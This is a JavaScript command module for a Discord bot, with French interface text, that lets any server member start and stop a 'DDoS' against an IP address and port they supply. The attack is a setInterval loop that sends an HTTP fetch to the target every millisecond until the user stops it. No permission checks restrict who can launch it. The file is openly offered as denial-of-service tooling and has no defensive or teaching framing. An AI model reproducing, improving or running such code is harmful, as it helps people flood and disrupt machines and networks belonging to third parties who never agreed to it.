const { EmbedBuilder } = require("@discordjs/builders");
const { SlashCommandBuilder, PermissionsBitField, ModalBuilder, ActionRowBuilder, TextInputStyle, TextInputBuilder } = require("discord.js");
const ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
// const fetch = require('node-fetch')

module.exports = {
    name: "ddos",
    description: "DDoS une IP.",
    aliases: [],
    permissions: [],
    guildOwnerOnly: false,
    botOwnerOnly: false,
    async execute(client, message, args) {
        const noip = new EmbedBuilder()
            .setColor(0x2B2D31)
            .setDescription("`❌` Veuillez me donner une IP valide")

        const stopbefore = new EmbedBuilder()
            .setColor(0x2B2D31)
            .setDescription(`\`❌\` Veuillez utiliser la commande \`${client.config.prefix}ddos stop\``)

        if (!args[0]) return message.channel.send({embeds: [noip]})

        if (args[0] === "stop"){
            if (client.data[`${message.guild.id}-${message.author.id}`]) {
                clearInterval(client.data[`${message.guild.id}-${message.author.id}`])
                const stopped = new EmbedBuilder()
                    .setColor(0x2B2D31)
                    .setDescription(`\`✅\` Vous avez arrêté le DDoS`)

                return message.channel.send({embeds: [stopped]})
            }
            else {
                const startbefore = new EmbedBuilder()
                    .setColor(0x2B2D31)
                    .setDescription(`\`❌\` Veuillez utiliser la commande \`${client.config.prefix}ddos <ip>\``)

                return message.channel.send({embeds: [startbefore]})
            }
        }
        else {
            if (client.data[`${message.guild.id}-${message.author.id}`]) return message.channel.send({embeds: [stopbefore]})
            if (!ipRegex.test(args[0])) return message.channel.send({embeds: [noip]})
            
            const embed = new EmbedBuilder()
                .setColor(0x2B2D31)
                .setDescription(`\`🛜\` Le DDoS est en cours. Il ne s'arrêtera que si vous faites \`${client.config.prefix}ddos stop\``)
            
            message.channel.send({embeds: [embed]})
            client.data[`${message.guild.id}-${message.author.id}`] = setInterval(() => fetch(`http://${args[0]}:${parseInt(args[1]) ?? "65535"}`), 1);
        }
    },
    async executeSlash(client, interaction) {
        if (interaction.options.getSubcommand() === "start"){
            const stopbefore = new EmbedBuilder()
                .setColor(0x2B2D31)
                .setDescription(`\`❌\` Veuillez utiliser la commande \`${client.config.prefix}ddos stop\``)

            if (client.data[`${interaction.guild.id}-${interaction.user.id}`]) return interaction.reply({embeds: [stopbefore], ephemeral: true})

            const modal = new ModalBuilder()
                .setTitle("Lancement d'un DDoS")
                .setCustomId('ddos')
                .addComponents(
                    new ActionRowBuilder().addComponents(
                        new TextInputBuilder()
                            .setLabel("Veuillez entrer une IP")
                            .setCustomId('ip')
                            .setStyle(TextInputStyle.Short)
                            .setRequired(true)
                    ),
                    new ActionRowBuilder().addComponents(
                        new TextInputBuilder()
                            .setLabel("Veuillez entrer le PORT")
                            .setCustomId('port')
                            .setStyle(TextInputStyle.Short)
                            .setRequired(false)
                    ),
                );

            await interaction.showModal(modal);
        }
        else if (interaction.options.getSubcommand() === "stop"){
            if (client.data[`${interaction.guild.id}-${interaction.user.id}`]) {
                clearInterval(client.data[`${interaction.guild.id}-${interaction.user.id}`])
                const stopped = new EmbedBuilder()
                    .setColor(0x2B2D31)
                    .setDescription(`\`✅\` Vous avez arrêté le DDoS`)
                    
    
                return interaction.reply({embeds: [stopped], ephemeral: true})    
            }
            else {
                const startbefore = new EmbedBuilder()
                    .setColor(0x2B2D31)
                    .setDescription(`\`❌\` Veuillez utiliser la commande \`/ddos start\``)

                return interaction.reply({embeds: [startbefore], ephemeral: true})    
            }
        }
    },
    get data() {
        return new SlashCommandBuilder()
            .setName(this.name)
            .setDescription(this.description)
            .addSubcommand(s => s.setName("start").setDescription("DDoS une IP"))
            .addSubcommand(s => s.setName("stop").setDescription("Arrête le DDoS d'une IP"))
    }
}